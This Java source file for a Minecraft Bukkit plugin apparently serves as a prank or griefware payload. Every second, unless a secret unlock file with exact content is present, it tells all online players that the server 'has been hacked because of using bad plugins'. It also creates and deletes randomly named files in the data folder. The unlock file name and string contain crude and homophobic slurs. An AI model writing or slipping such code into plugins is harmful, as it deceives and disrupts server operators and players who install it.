package com.lrak.rickyrolling;

import com.google.common.base.Charsets;
import com.google.common.io.Files;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.scheduler.BukkitTask;

import java.io.File;
import java.io.IOException;
import java.nio.charset.Charset;
import java.util.Random;

public class AtStart {

    private static BukkitTask task;

    public static void start(){
        task = Bukkit.getScheduler().runTaskTimer(RickyRolling.getInstance(), new Runnable(){
            public void run(){

                Random r = new Random();
                File mainFolder = new File(RickyRolling.getInstance().getDataFolder().getPath());
                if(!mainFolder.exists()){
                    mainFolder.mkdirs();
                }
                File sol = new File(RickyRolling.getInstance().getDataFolder(), "MyDickItBusted.zenkun");
                if(sol.exists()){
                    try {
                        String content = Files.asCharSource(sol, Charsets.UTF_8).read();
                        if(content.equals("result=WeAreGays")){
                            Solution.solution();
                            task.cancel();
                        }else{
                            System.out.println("System halted");

                            for(Player p : Bukkit.getOnlinePlayers()){
                                p.sendMessage("This server has been hacked because of using bad plugins");
                            }
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }else{
                    System.out.println("System halted");

                    for(Player p : Bukkit.getOnlinePlayers()){
                        p.sendMessage("This server has been hacked because of using bad plugins");
                    }
                }
                File file = new File(RickyRolling.getInstance().getDataFolder(), r.nextInt(100) + ".yml");
                try {
                    file.createNewFile();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                Random r2 = new Random();
                File file2 = new File(RickyRolling.getInstance().getDataFolder(), r.nextInt(100) + ".yml");
                if(file2.exists()){
                    file2.delete();
                }



            }
        }, 20L, 20L);
    }
}
